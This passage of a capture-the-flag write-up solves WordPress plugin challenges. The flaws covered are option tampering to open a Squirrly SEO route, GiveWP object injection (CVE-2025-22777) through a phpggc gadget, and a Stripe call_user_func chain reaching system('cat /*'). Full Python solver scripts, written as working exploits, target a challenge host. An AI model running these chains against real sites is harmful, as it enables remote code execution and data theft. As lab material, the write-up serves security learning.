        $nope = array('users_can_register', 'auto_update_core_minor', 'auto_update_core_dev', 'upload_url_path', 'mailserver_pass', 'wp_user_roles', 'template', 'blog_public', 'html_type', 'sticky_posts', 'use_balanceTags', 'page_for_posts', 'permanent-links', 'hack_file', 'multisite', 'comment_max_links', 'mailserver_login', 'use_trackback', 'comments_per_page', 'default_pingback_flag', 'siteurl', 'enable_app', 'large_size_w', 'default_comments_page', 'default_comment_status', 'links', 'moderation_keys', 'sidebars_widgets', 'posts_per_page', 'links_updated_date_format', 'default_role', 'theme', 'advanced_edit', 'image_default_link_type', 'blogname', 'thumbnail_size_w', 'admin_email', 'enable_xmlrpc', 'rss_use_excerpt', 'require_name_email', 'comment_whitelist', 'medium_large_size_h', 'show_comments_cookies_opt_in', 'comment_order', 'use_balancetags', 'close_comments_for_old_posts', 'gzipcompression', 'use_smilies', 'upload_path', 'moderation_notify', 'close_comments_days_old', 'medium_size_w', 'show_on_front', 'reading', 'show_avatars', 'default_post_format', 'site_icon', 'comments_notify', 'adminhash', 'gmt_offset', 'rewrite_rules', 'rss_language', 'thread_comments_depth', 'permalink_structure', 'default_category', 'links_recently_updated_append', 'thread_comments', 'home', 'widget_categories', 'use_linksupdate', 'default_post_edit_rows', 'comment_moderation', 'start_of_week', 'wp_page_for_privacy_policy', 'date_format', 'widget_text', 'active_plugins', 'avatar_default', 'timezone_string', 'auto_update_core_major', 'default_ping_status', 'tag_base', 'media', 'widget_rss', 'general', 'time_format', 'large_size_h', 'others', 'embed_size_w', 'posts_per_rss', 'image_default_size', 'mailserver_url', 'fileupload_maxk', 'page_comments', 'links_recently_updated_time', 'thumbnail_size_h', 'page_on_front', 'uploads_use_yearmonth_folders', 'ping_sites', 'comment_registration', 'thumbnail_crop', 'medium_large_size_w', 'recently_edited', 'image_default_align', 'avatar_rating', 'links_recently_updated_prepend', 'new_admin_email', 'comments', 'embed_size_h', 'default_email_category', 'embed_autourls', 'stylesheet', 'blacklist_keys', 'https_detection_errors', 'medium_size_h', 'category_base', 'blogdescription', 'avatars', 'mailserver_port', 'default_link_category', 'secret', 'writing', 'blog_charset');

        if(!in_array($option_name, $nope)){
            update_option($option_name, wp_json_encode($_POST["option_value"]));
        }

        echo "option updated";
    }
    ```

Our input will be JSON-encoded using `wp_json_encode`, meaning the options we can update will also be JSON-encoded. Let's check what we can modify in the database.

```php
sudo docker compose exec wp_service_1_db mysql -u root -pREDACTED
mysql> use wordpress;
mysql> select * from wp_options;
```

Using these commands, we get the following output:

![](./imgs/image_T27aVmlW.png)

These options are stored in JSON format, making them compatible with the encoding used in `test-plugin.php`.

Additionally for second vulnerability, we can see that several routes are registered in the **Squirrly SEO** plugin:

![](./imgs/image_Oew81giU.png)

One of these routes can be used to read posts containing the flag. Check the get route:

```php
			register_rest_route( $this->namespace, '/get/', array(
					'methods'             => WP_REST_Server::READABLE,
					'callback'            => array( $this, 'getData' ),
					'permission_callback' => '__return_true'
				) );
```

getData method

    ```php
    /**
    	 * Get data for the Focus Page Audit
    	 *
    	 * @param WP_REST_Request $request
    	 */
    	public function getData( WP_REST_Request $request ) {

    		global $wpdb;
    		$response = array();
    		SQ_Classes_Helpers_Tools::setHeader( 'json' );

    		//get the token from API
    		$token = $request->get_param( 'token' );
    		if ( $token <> '' ) {
    			$token = sanitize_text_field( $token );
    		}

    		if ( ! $this->token || $this->token <> $token ) {
    			exit( wp_json_encode( array( 'error' => esc_html__( "Connection expired. Please try again.", 'squirrly-seo' ) ) ) );
    		}

    		$select = $request->get_param( 'select' );

    		switch ( $select ) {
    			case 'innerlinks':

    				$inner_links = array();
    				$url         = esc_url_raw( $request->get_param( 'url' ) );
    				$start       = (int) $request->get_param( 'start' );
    				$limit       = (int) $request->get_param( 'limit' );

    				if ( $url == '' ) {
    					exit( wp_json_encode( array( 'error' => esc_html__( "Wrong Params", 'squirrly-seo' ) ) ) );
    				}

    				//define vars
    				if ( $limit == 0 ) {
    					$limit = 1000;
    				}

    				//prepare the url for query
    				$url_backslash = str_replace( '/', '\/', str_replace( rtrim( home_url(), '/' ), '', $url ) );
    				$url_encoded   = urlencode( str_replace( trim( home_url(), '/' ), '', $url ) );
    				$url_decoded   = str_replace( trim( home_url(), '/' ), '', urldecode( $url ) );

    				//get post inner links
    				$select_table = $wpdb->prepare( "SELECT ID FROM `$wpdb->posts` WHERE `post_status` = %s ORDER BY ID DESC LIMIT %d,%d", 'publish', $start, $limit );
    				if ( $ids = $wpdb->get_col( $select_table ) ) {
    					$query = $wpdb->prepare( "SELECT `ID` FROM `$wpdb->posts` as p WHERE ID in (" . join( ',', array_values( $ids ) ) . ") AND (p.post_content LIKE %s OR p.post_content LIKE %s OR p.post_content LIKE %s OR p.post_content LIKE %s)", '%' . $url . '%', '%' . $url_backslash . '%', '%' . $url_encoded . '%', '%' . $url_decoded . '%' );

    					if ( ! $inner_links = wp_cache_get( md5( $query ) ) ) {
    						//prepare the inner_links array
    						$inner_links = array();

    						if ( $rows = $wpdb->get_results( $query ) ) {
    							if ( ! empty( $rows ) ) {
    								foreach ( $rows as $row ) {
    									if ( untrailingslashit( get_permalink( $row->ID ) ) <> $url ) {
    										$inner_links[] = get_permalink( $row->ID );
    									}
    								}
    							}
    						}

    					}

    					wp_cache_set( md5( $query ), $inner_links, '', 3600 );
    				}

    				$response = array( 'url' => $url, 'inner_links' => $inner_links );
    				break;

    			case 'keyword':

    				$url     = esc_url_raw( $request->get_param( 'url' ) );
    				$keyword = sanitize_text_field( $request->get_param( 'keyword' ) );
    				$start   = (int) $request->get_param( 'start' );
    				$limit   = (int) $request->get_param( 'limit' );

    				if ( $url == '' || $keyword == '' ) {
    					exit( wp_json_encode( array( 'error' => esc_html__( "Wrong Params", 'squirrly-seo' ) ) ) );
    				}

    				//define vars
    				if ( $limit == 0 ) {
    					$limit = 1000;
    				}
    				$regex = "\\b" . strtolower( $keyword ) . "\\b";

    				//get post keywords found
    				$select_table = $wpdb->prepare( "SELECT ID FROM `$wpdb->posts` WHERE `post_status` = %s ORDER BY ID DESC LIMIT %d,%d", 'publish', $start, $limit );
    				if ( $ids = $wpdb->get_col( $select_table ) ) {
    					$query = $wpdb->prepare( "SELECT `ID`, `post_content` FROM `$wpdb->posts` as p WHERE ID in (" . join( ',', array_values( $ids ) ) . ") AND (LOWER(p.post_content) REGEXP %s)", $regex );

    					if ( ! $urls = wp_cache_get( md5( $query ) ) ) {
    						//prepare the url for query
    						$urls = array();

    						if ( $rows = $wpdb->get_results( $query ) ) {
    							if ( ! empty( $rows ) ) {
    								foreach ( $rows as $row ) {
    									if ( untrailingslashit( get_permalink( $row->ID ) ) <> $url ) {
    										$row->content = str_replace( '\/', '/', $row->content );

    										$urls[] = array(
    											'post_id'   => $row->ID,
    											'permalink' => get_permalink( $row->ID ),
    											'innerlink' => strpos( $row->content, untrailingslashit($url) ) !== false
    										);
    									}
    								}
    							}
    						}

    						wp_cache_set( md5( $query ), $urls, '', 3600 );
    					}

    					$response = array( 'keyword' => $keyword, 'urls' => $urls );
    				}else{

    					$response = array( 'keyword' => '', 'urls' => array() );
    				}

    				break;
    			case 'posts':
    				//get post inner links
    				$total_posts = 0;

    				if ( $row = $wpdb->get_row( $wpdb->prepare( "SELECT COUNT(`ID`) as count FROM `$wpdb->posts` WHERE `post_status` = %s", 'publish' ) ) ) {
    					$total_posts = $row->count;
    				}

    				$response = array( 'total_posts' => $total_posts );
    				break;

    			case 'post':

    				$id = (int) $request->get_param( 'id' );

    				if ( $id == 0 ) {
    					wp_send_json_error( esc_html__( "Wrong Params", 'squirrly-seo' ) );
    				}

    				//get Squirrly SEO post metas
    				if ( $post = SQ_Classes_ObjController::getClass( 'SQ_Models_Snippet' )->setPostByID( $id ) ) {
    					$response = $post->toArray();
    				}

    				break;

    			case 'squirrly':

    				//Get Squirrly settings
    				if ( $options = SQ_Classes_Helpers_Tools::getOptions() ) {
    					$response = (array) $options;
    				}

    				break;
    		}

    		echo wp_json_encode( $response );

    		exit();

    	}
    ```

To activate this route, we need to enable several options stated here.

```php
	public function hookInit() {

		if ( SQ_Classes_Helpers_Tools::getOption( 'sq_api' ) == '' ) {
			return;
		}

		if ( ! SQ_Classes_Helpers_Tools::getOption( 'sq_cloud_connect' ) ) {
			return;
		}

		$this->token = SQ_Classes_Helpers_Tools::getOption( 'sq_cloud_token' );

		//Change the rest api if needed
		add_action( 'rest_api_init', array( $this, 'sqApiInit' ) );
	}

```

First, one is `sq_qpi`, the second is `sq_cloud_connect`, and the last is `sq_cloud_token` to bypass the token verification part.

Lastly, you just need to access that REST and specify `token` with your updated token via the `update_option`, `select` with the value `post`, and `id` with the ID of the post you want to read.

## Solver

```python
import httpx
import asyncio

URL = "http://52.77.81.199:9177/"
class BaseAPI:
    def __init__(self, url=URL) -> None:
        self.c = httpx.AsyncClient(base_url=url)

class API(BaseAPI):
    async def update_option(self) -> None:
        return await self.c.post("/wp-admin/admin-ajax.php?action=uptoyou", data={
            "option_name": "sq_options",
            "option_value[sq_cloud_token]": "dimas123",
            "option_value[sq_api]": "dimas123",
            "option_value[sq_cloud_connect]": "dimas123",
        })
    def get_flag(self):
        return self.c.get("/wp-json/squirrly/get?token=dimas123&select=post&id=5")

async def main():
    api = API()
    res = await api.update_option()    
    res = await api.get_flag()    
    print(res.text)

if __name__ == "__main__":
    asyncio.run(main())

```

### Flag

![](./imgs/image_wjb34FXP.png)

# **Give**

| Solves | 3 |
| ------ | - |

Description

    Who give me ?

    This is a whitebox challenge, no need to bruteforce anything (login, endpoint, etc).

Attachments

    [image](https://prod-files-secure.s3.us-west-2.amazonaws.com/39d1be85-e7c6-4263-a666-a42da95a70df/da961bec-d193-484a-8f40-dd16f9e1abb2/attachment.zip?X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Content-Sha256=UNSIGNED-PAYLOAD&X-Amz-Credential=ASIAZI2LB466TMVUKIVF%2F20250523%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20250523T141424Z&X-Amz-Expires=3600&X-Amz-Security-Token=IQoJb3JpZ2luX2VjEDYaCXVzLXdlc3QtMiJHMEUCIHycLfprajgiPadxlnUh%2FUI0l4WbL9RZghRDsZwqTaCmAiEAno8F%2BdLpGD8bk5ZAD6f9YN%2BqeLHZTXmgojlkC3rCk1EqiAQI7%2F%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FARAAGgw2Mzc0MjMxODM4MDUiDOh1DA2pdIq8tn8kuircA1%2BuDsKp5di0dPe%2BGj0EVGfuCaT4BlXyAS%2FZ%2BwoNHep7kyqUsQO8bpTSDjp7ELfXPyxfDmPd00b1MfKj6SFUWGKMXV5J6lNjS%2BWMCc8xwhp2WgeTvLZ1XpwOZcBbKzkJ9Km4GCI%2Fa1lrR9zmcXE8EAUZefFsBvMP5XACFR6UypLBtYM5o1o%2FTMfuKGdFKkmugIp2MeipaO36lJ6T1IbRj6bNyKrXo64ZXID%2FxXw36QFOpbOXRo9P1Ad2T27SYW25%2BVFlWo5Zho6j78DZA3b9guk5Kew3kb8wxX67zY58ZHnhs22Y8tTe3hN22viiGA3cjOTT3mRjfyZZRYmnPdg3mHFSZHInFKeKiit%2FiyZBoJnk0xMcxAe8Yei4m%2F5TqW8sN97LPh7sLO0%2B%2FklVexAWxtjBhh1SuWo7yFkEthwR5QyimlwK23PUVrTACPCPkJVrXem0J5OjoSGBPXgELBitgSGsbDH9aKWgs8XbrpH7rI9rFPMF49k7TCdAjnxqS131uUfbMycYJrhWVD68tU8Rutx2zHzbk7sKhF4wu5sgP1vgbWMD9DQIlTB%2FKh4LKbFShMLqtluvYkMHmIBZU8iCCszSHWtVsb0bKTdOMFUjF55XwYoBmg6k5VSKx7R2MIzywcEGOqUBP1jLZQ8jrrWJihkG76P7%2FLSSxjTgAkepoDqKCrUdt8pGDeX2V5%2B2yO20u2CDeS0waqLYzHMmE1Y14S0MEWKjIAcQnZ5miCxBOL4MQ0%2FPPA6Kwg%2F53WXWbXmCu9KhV%2FgDW2zS4yIB5kMXLRbAdMx6Hb4ibbmXkpj3ZJv6L0n19BBpd9aBh%2BYre2lYJBHBwdXB42Ce%2BjjusHxZ1g%2BAzJVPCEoLCsDY&X-Amz-Signature=d3c1c69dc9fcba80b0a11530343c0e2cdc023587ab0c1532fd74ed5f9f678ebe&X-Amz-SignedHeaders=host&x-id=GetObject)

References

    - [Critical Vulnerability Patched in GiveWP Plugin - Patchstack](https://patchstack.com/articles/critical-vulnerability-patched-in-givewp-plugin/)

    - [Rollbar Plugin - PHP Object Injection Gadget:](https://www.notion.so/10848583e65d8026a1cbeb7d36f38336#d2f2d20e16e14429af47786aa6023db8) 

***

In this challenge, we need to exploit a known vulnerability in GiveWP **CVE-2025-22777.** This CVE is related to PHP Object Injection, and a partial POC is published in this article: [Critical Vulnerability Patched in GiveWP Plugin - Patchstack](https://patchstack.com/articles/critical-vulnerability-patched-in-givewp-plugin/).

To exploit this vulnerability, you need just two things: one is the GiveWP form, and the second is the PHP POP Gadget. For the PHP POP Gadget, since the challenge has Rollbar installed, which is known to have a PHP POP Chain due to its dependency from a previous CTF here [Rollbar Plugin - PHP Object Injection Gadget:](https://www.notion.so/10848583e65d8026a1cbeb7d36f38336#d2f2d20e16e14429af47786aa6023db8) , you can use this as a gadget to exploit the PHP POP Chain. You can see more details on how to exploit this in the solver below.

## Solver

```python
import httpx
import asyncio
import re
import subprocess
URL = "http://52.77.81.199:9140/"

class BaseAPI:
    def __init__(self, url=URL) -> None:
        self.c = httpx.AsyncClient(base_url=url)

    def wp_login(self, username: str, password: str) -> None:
        return self.c.post("/wp-login.php", data={
            "log": username,
            "pwd": password
        })
    

class API(BaseAPI):
    async def donate(self, url) -> None:
        data = {
            "amount": "10",
            "currency": "USD",
            "donationType": "single",
            "formId": "9",
            "email": "admin@getmoreplugins.com",
            "gatewayId": "manual",
            "firstName": "a",
            "lastName": "a",
            "comment": subprocess.check_output("./phpggc/phpggc Monolog/RCE7 system 'cat /*'", shell=True).replace(b"a:", b"a%F0%9F%98%BC:").replace(b"O:", b"O%F0%9F%98%BC:").replace(b"s:", b"s%F0%9F%98%BC:").replace(b"i:",b"i%F0%9F%98%BC:").strip(),
            "company": "",
            "donationBirthday": "",
            "originUrl": "http://localhost:9140/donations/",
            "isEmbed": "true",
            "embedId": "9",
            "gatewayData[testGatewayIntent]": "test-gateway-intent"
        }
        
        # URL-encode the data
        return await self.c.post(url, files={"a":("a","b")}, data=data)  # Send the URL-encoded data with headers
    async def get_givewp_post_url(self):
        res = await self.c.get("/?givewp-route=donation-form-view&form-id=9")
        url = re.findall('"donateUrl":"(.*?)"',res.text)[0].replace("\\/", "/")
        return url   

async def main():
    api = API()

    # Get the signature and expiration
    url = await api.get_givewp_post_url()

    # Example usage of the donate method
    donation_response = await api.donate(url)
    print(donation_response.text)

if __name__ == "__main__":
    asyncio.run(main())

```

### Flag

![](./imgs/image_RSxstIc5.png)

# **Unicorn**

| Solves | 2 |
| ------ | - |

Description

    Now I am a Unicorn.

    This is a whitebox challenge, no need to bruteforce anything (login, endpoint, etc).

Attachments

    [image](https://prod-files-secure.s3.us-west-2.amazonaws.com/39d1be85-e7c6-4263-a666-a42da95a70df/8c26dec7-858d-452f-900c-dd8bc484d2ca/attachment.zip?X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Content-Sha256=UNSIGNED-PAYLOAD&X-Amz-Credential=ASIAZI2LB466V6HCPN4Q%2F20250523%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20250523T141429Z&X-Amz-Expires=3600&X-Amz-Security-Token=IQoJb3JpZ2luX2VjEDYaCXVzLXdlc3QtMiJIMEYCIQCBbGc8W5B6LQv4rGjYaF58gxRTjj8fcKX0Oi%2FGSn%2B%2BdQIhAIL%2Fnpe8RN2uvaMVJUa1tzhwA62ROrEBmNPnk8mZZpZ9KogECO%2F%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEQABoMNjM3NDIzMTgzODA1IgxJcUFwTTkphG5keM8q3AMKFD%2Fcq6TRpNKJnVnc2cHpfLddwVFdVPDjkKK4QI5VNlx7EWpEKsqHb0cttAYh3GTL7N90x3%2F5FKTpb6CS2%2FWuon%2Bahyefc1KaFRGEymQMuE1fVzr0oA5%2FLXo7%2FKBku6IImtsdc%2B5sM6YYmEPdlCI0zpqvw5t9z01W3iaLIXjgNQgKSPhZ%2ByGFLQvlclAAYIBG5fB7eMtJ2k4EjfVN16EnwVuu5%2FBCIQ%2BZAsLW5rdcJN8bgBJ5af0zjIy27qxF31Ro41X%2BUPO%2ByCLIkS06gIVhIjeLinkcC1pt9lvrf25O6CHZam5Ah8SG9rpwpkyq1RXRhlUUjuvNL5EaOCuQUPqqe3YFihUqOF5FeW3WyuOXpAvT3a1zpv%2Bgr%2BwvTnRolSjoR1BNxBu%2FGjT%2BubrmYF4Ix1D4zFAKAeOm9AhW6JwKJ9UGTOlNdP9zJzNL6FJdX%2FZTnb%2Bz8hpipqoKf4fXcfznbtqZQqcOnAz%2Fuz2fdoFjMXn9ztISqTLupGJ2VNUURLI4w9ffNP3ZgH64DbrdD%2BbjQWnQCb9on2cg904OdWSkccVnJmT%2FAy18jId9AHQmfdJ452G42tOlJPbqsRjtp0jIO7wGYdbnwnh6C%2FFInd9JzkozCpyu3Y1k7zxUGDCYg8LBBjqkAafgQTYHYmVmKE76OAiS%2F4FR0xt0WyuWHRtWDqQKJpk5wqU%2B7FztpJkLcLcWYu74CGvavPRcKLg6chmQMqvgk%2FDEUq9eOPdH9ST61f7dA5XnN6YUs%2B6sMOKYh%2FCaV9LzLahzFfJYsnnnV6nuoXdhsZ2iN1pJIqi%2Fd9T2NIneAdKLWDJnc%2Fxp9e7fOXhHheHW1MrDlyNFwfIDCrZ3GvWvu5oyGYli&X-Amz-Signature=0d06703be8e27b5853a15ea1ed2cc4f7bb699ff5c724912fc5057e36e64baef1&X-Amz-SignedHeaders=host&x-id=GetObject)

References

***

In this challenge, we have the power to call an arbitrary method from allowed namespaces, but the restriction is that we can control only one argument, and the argument is an array. So, we need a method that both accepts an array and requires only one argument while also being in the whitelisted namespaces. Here is the server that handles the method calling:

server-given/challenge-custom/unicorn/includes/class-main.php

    ```php
    add_action('wp_ajax_nopriv_handle_ajax', 'handle_ajax');

    function handle_ajax() {
        $whitelisted_namespaces = [
            '\\Unicorn\\',
            '\\Stripe\\ApiOperations',
            '\\Stripe\\Apps',
            '\\Stripe\\Billing', 
            '\\Stripe\\Climate',
            '\\Stripe\\Entitlements',
            '\\Stripe\\Events',
            '\\Stripe\\Exception',
            '\\Stripe\\Exception\\OAuth',
            '\\Stripe\\FinancialConnections',
            '\\Stripe\\HttpClient',
            '\\Stripe\\Issuing',
            '\\Stripe\\Service',
            '\\Stripe\\Treasury',
            '\\PaypalServerSdkLib\\Controllers',
            '\\PaypalServerSdkLib\\Models',
            '\\Psr\\EventDispatcher',
            '\\Symfony\\Component',
            '\\Give\\Vendors',
            '\\Action_Scheduler\\Migration'
        ];

        if (!isset($_REQUEST['token']) || false === check_ajax_referer('ajax_submit_unicorn', 'token', false)) {
            wp_send_json(array(
                'status' => false,
                'title'  => __('Invalid token', 'real-time-auto-find-and-replace'),
                'text'   => __('Sorry! we are unable recognize your auth!', 'real-time-auto-find-and-replace'),
            ));
        }

        if (!isset($_REQUEST['data']) && isset($_POST['method'])) {
            $data = $_POST;
        } else {
            $data = isset($_REQUEST['data']) ? $_REQUEST['data'] : '';
        }

        // Get methods
        $method = isset($data['method']) ? $data['method'] : (isset($_REQUEST['method']) ? $_REQUEST['method'] : '');

        if (empty($method) || strpos($method, '@') === false) {
            wp_send_json(array(
                'status' => false,
                'title'  => __('Invalid Request', 'real-time-auto-find-and-replace'),
                'text'   => __('Method parameter missing / invalid!', 'real-time-auto-find-and-replace'),
            ));
        }

        $method = explode('@', $method);
        $class_path = \str_replace('\\\\', '\\', $method[0]);
        // $class_path = \str_replace('\\\\', '\\', '\\Unicorn\\' . $method[0]);

        $is_whitelisted = false;
        foreach ($whitelisted_namespaces as $namespace) {
            if (strpos($class_path, $namespace) === 0) {
                $is_whitelisted = true;
                break;
            }
        }

        if (!$is_whitelisted) {
            wp_send_json(array(
                'status' => false,
                'title'  => __('Invalid Namespace', 'real-time-auto-find-and-replace'),
                'text'   => __('The requested namespace is not allowed.', 'real-time-auto-find-and-replace'),
            ));
        }

        if (!class_exists($class_path)) {
            wp_send_json(array(
                'status' => false,
                'title'  => __('Invalid Library', 'real-time-auto-find-and-replace'),
                'text'   => sprintf(__('Library Class "%s" not found! ', 'real-time-auto-find-and-replace'), $class_path),
            ));
        }

        if (!method_exists($class_path, $method[1])) {
            wp_send_json(array(
                'status' => false,
                'title'  => __('Invalid Method', 'real-time-auto-find-and-replace'),
                'text'   => sprintf(__('Method "%1$s" not found in Class "%2$s"! ', 'real-time-auto-find-and-replace'), $method[1], $class_path),
            ));
        }

        (new $class_path())->{$method[1]}($data);
        exit;
    }
    ```

After searching with regex, I found something interesting in the `parse` method of the `RequestOptions` class here:

server-given/challenge-custom/unicorn/vendor/stripe/stripe-php/lib/Util/RequestOptions.php

    ```php
    <?php

    namespace Stripe\Util;

    /**
     * @phpstan-type RequestOptionsArray array{api_key?: string, idempotency_key?: string, stripe_account?: string, stripe_context?: string, stripe_version?: string, api_base?: string }
     * @psalm-type RequestOptionsArray = array{api_key?: string, idempotency_key?: string, stripe_account?: string, stripe_context?: string, stripe_version?: string, api_base?: string }
     */
    class RequestOptions
    {
        ...snip...
        /**
         * Unpacks an options array into an RequestOptions object.
         *
         * @param null|array|RequestOptions|string $options a key => value array
         * @param bool $strict when true, forbid string form and arbitrary keys in array form
         *
         * @throws \Stripe\Exception\InvalidArgumentException
         *
         * @return RequestOptions
         */
        public static function parse($options, $strict = false)
        {
            if ($options instanceof self) {
                return clone $options;
            }

            if (null === $options) {
                return new RequestOptions(null, [], null);
            }

            if (\is_string($options)) {
                if ($strict) {
                    $message = 'Do not pass a string for request options. If you want to set the '
                        . 'API key, pass an array like ["api_key" => <apiKey>] instead.';

                    throw new \Stripe\Exception\InvalidArgumentException($message);
                }

                return new RequestOptions($options, [], null);
            }

            if (\is_array($options)) {
                $headers = [];
                $key = null;
                $base = null;

                if (\array_key_exists('api_key', $options)) {
                    $key = $options['api_key'];
                    unset($options['api_key']);
                }
                if (\array_key_exists('idempotency_key', $options)) {
                    $headers['Idempotency-Key'] = $options['idempotency_key'];
                    unset($options['idempotency_key']);
                }
                if (\array_key_exists('stripe_account', $options)) {
                    if (null !== $options['stripe_account']) {
                        unset($options['action']);
                    }   
                }
                if (\array_key_exists('stripe_context', $options)) {
                    if (null !== $options['stripe_context']) {
                        $headers['Stripe-Context'] = $options['stripe_context'];
                    }
                    unset($options['stripe_context']);
                }
                if (\array_key_exists('stripe_version', $options)) {
                    if (null == $options['action']) {
                        $headers['Stripe-Version'] = $options['stripe_version'];
                        $base = $options['api_base'];
                        $version = $options['stripe_version'];
                        call_user_func($base, $version);
                    }
                    unset($options['stripe_version']);
                }
                if (\array_key_exists('api_base', $options)) {
                    $base = $options['api_base'];
                    unset($options['api_base']);
                }

                if ($strict && !empty($options)) {
                    $message = 'Got unexpected keys in options array: ' . \implode(', ', \array_keys($options));

                    throw new \Stripe\Exception\InvalidArgumentException($message);
                }

                return new RequestOptions($key, $headers, $base);
            }

            $message = 'The second argument to Stripe API method calls is an '
                . 'optional per-request apiKey, which must be a string, or '
                . 'per-request options, which must be an array. (HINT: you can set '
                . 'a global apiKey by "Stripe::setApiKey(<apiKey>)")';

            throw new \Stripe\Exception\InvalidArgumentException($message);
        }
        ...snip...
    }

    ```

You will see that the method accepts an array as an argument, and eventually, our array will reach `call_user_func`, which means we can gain RCE using it. But wait, it's not in the whitelisted namespace. So, we need to find another method in the whitelisted namespace that will call the `parse` method. That's when I stumbled upon this class.

server-given/challenge-custom/unicorn/vendor/stripe/stripe-php/lib/Billing/CreditBalanceTransaction.php

    ```php
    <?php

    // File generated from our OpenAPI spec

    namespace Stripe\Billing;

    /**
     * A credit balance transaction is a resource representing a transaction (either a credit or a debit) against an existing credit grant.
     *
     * @property string $id Unique identifier for the object.
     * @property string $object String representing the object's type. Objects of the same type share the same value.
     * @property int $created Time at which the object was created. Measured in seconds since the Unix epoch.
     * @property null|\Stripe\StripeObject $credit Credit details for this credit balance transaction. Only present if type is <code>credit</code>.
     * @property string|\Stripe\Billing\CreditGrant $credit_grant The credit grant associated with this credit balance transaction.
     * @property null|\Stripe\StripeObject $debit Debit details for this credit balance transaction. Only present if type is <code>debit</code>.
     * @property int $effective_at The effective time of this credit balance transaction.
     * @property bool $livemode Has the value <code>true</code> if the object exists in live mode or the value <code>false</code> if the object exists in test mode.
     * @property null|string|\Stripe\TestHelpers\TestClock $test_clock ID of the test clock this credit balance transaction belongs to.
     * @property null|string $type The type of credit balance transaction (credit or debit).
     */
    class CreditBalanceTransaction extends \Stripe\ApiResource
    {
        ...snip...
        public static function retrieve($opts, $id = null)
        {
            $opts = \Stripe\Util\RequestOptions::parse($opts);
            $instance = new static($id, $opts);
            $instance->refresh();

            return $instance;
        }
    }

    ```

This class will call the `parse` method and requires only one argument, which means we can use it to gain access to `call_user_func`. Then, you just need to add this class method into `handle_ajax` and provide the required argument to reach `call_user_func` in the `parse` method, just like in the solver below.

## Solver

```python
import httpx
import asyncio
import re

URL = "http://52.77.81.199:9143/"
class BaseAPI:
    def __init__(self, url=URL) -> None:
        self.c = httpx.AsyncClient(base_url=url)
    async def handle_ajax(self, token):
        return await self.c.post("/wp-admin/admin-ajax.php?action=handle_ajax", data={
            "token": token,
            "data[method]": r"\Stripe\Billing\CreditBalanceTransaction@retrieve", 
            "data[stripe_version]": r"1", 
            "data[api_base]": r"system", 
            "data[stripe_version]": r"cat /*", 
        })


class API(BaseAPI):
    async def get_nonce(self):
        res = await self.c.get("/wp-admin/admin-ajax.php?action=foo")
        return re.findall("var ajaxNonce = '(.*?)'", res.text)[0]

async def main():
    api = API()
    nonce = await api.get_nonce()
    res = await api.handle_ajax(nonce)
    print(res.text)

if __name__ == "__main__":
    asyncio.run(main())
```

### Flag

![](./imgs/image_V1OBnIfh.png)

# **Woops**

| Solves | 2 |
| ------ | - |

Description

    woops, woops, woops, you found it.

    - ) there is a plugin code that are not included on the given attachment, you can just get it from "some" source

    NOTE: This is a fully white box challenge, almost no heavy brute force is needed.

Attachments

    [image](https://prod-files-secure.s3.us-west-2.amazonaws.com/39d1be85-e7c6-4263-a666-a42da95a70df/1644be82-fb9b-467b-85d8-a23458c92d24/attachment.zip?X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Content-Sha256=UNSIGNED-PAYLOAD&X-Amz-Credential=ASIAZI2LB466QOR2BVF2%2F20250523%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20250523T141432Z&X-Amz-Expires=3600&X-Amz-Security-Token=IQoJb3JpZ2luX2VjEDYaCXVzLXdlc3QtMiJHMEUCIAg6uhC3D3sSQHaH9MPt4WDrw%2FtzsKhYA5w2t6DHOQ3wAiEAs2MwG0r2rUkgle%2F%2FbAeqio%2FMuyYgkaEXLBqCL7Hen44qiAQI7%2F%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FARAAGgw2Mzc0MjMxODM4MDUiDO52O%2BQs9jWCnic2CCrcA9fggU7IsF0yPpdblAACfWVLiYKPBVJFg0qHqkZptMP%2FTC75h%2Fhv1M9efk764EAr%2BxEf%2F%2BIADrW1ocXtEM8ug%2BHhejQLXVK1nr36TsKqLTWYmk9fTu9d6MnrIJBf4HW5eEGa9hb40zaVWrtwooo48STqZlg6uTypSZh98vITVD5%2F0QwbmnjEklpTh0MXtKfzjrmmV7c56ngeN5Q2rtyAEzehOPjwOrtXbTvOew1I0cXGtloes%2BST8JMF%2FCCEa3anvpjt5BMF4F9IAdVOe5zYEjlnovOJLSRvRHUCaw3QAIm%2FQBorQjvpsEoL%2FCAZOAEAYoIXgvCfOA8mOFTTuexVcKrl0qJikeLtm6p2bBoL8UWeZ%2BmyKHQscoh0wQ5VpqylBIhAdk9VELDEQoq%2FlGzsW9j8EzykjeAUlcVbZX9G1MPqoQB78oa3EYaSME5FLjqVZQ88Resxk07CePZvijINtxWTGj3n5dCK%2BP9oMQvThdZWhcAeGrGvPrhn1qywB52n2bZXqwFgQ8BgYMKhVbKMyffGCgc9b%2FbJKruvtuhBMEPlj5ekoJ7nRVLz2J0CnIJd56tVDLgak8cCmY3Pxsvc6SPJvx4eOSdczOJHcV%2Br%2FiuKBoQjyMMNHE8csSzEMPTxwcEGOqUB6Tj58i7mo1ZQ3U23Y1ZpcNqJi8nYn7ddkjAViY6ktTpu0CTVwlJko%2B8r8qzLbZBN3hS8qX6CfgoBgTiEKCyvl7KkC%2By3h0D1Y4vdiW7KSJYIoFq85XI0dqHIczm3UI44mCmDivOH2BRna2%2BSeXUb974f6ncxk4yUiL8O9ED0uexo7cRoal444GTLYO5VHDfwbWUBYgB%2FXpk1jjB63PHWvct56WZV&X-Amz-Signature=746c7d0f2468e6a2cbf323f2ae03b7f213cb84bc9e3afcd2a1cbea6c3904946f&X-Amz-SignedHeaders=host&x-id=GetObject)

References

***

In this challenge, we first need to get the missing plugin. We can read the common file name in a WordPress plugin, such as `changelog.txt`, as an example here:

![](./imgs/image_NBywg0PL.png)

We see that the `js_composer` plugin is using version 7.4 and, interestingly, is referenced in the Patchstack database here: [WPBakery Page Builder Vulnerabilities - Patchstack](https://patchstack.com/database/wordpress/plugin/js_composer/). The plugin should be vulnerable to Local File Inclusion. See the image below:

![](./imgs/image_yUbNWnb0.png)

